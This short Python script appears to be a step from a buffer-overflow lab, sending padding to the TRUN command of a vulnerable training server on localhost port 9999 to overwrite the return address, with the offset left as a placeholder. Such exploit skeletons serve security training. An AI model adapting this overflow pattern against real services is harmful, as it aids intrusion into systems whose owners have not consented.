import socket
 
offset = <YOUR_OFFSET>  # value from msf-pattern_offset
 
shellcode = b"A" * offset + b"B" * 4
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(b"TRUN /.:/ " + shellcode + b"\r\n")
s.close()
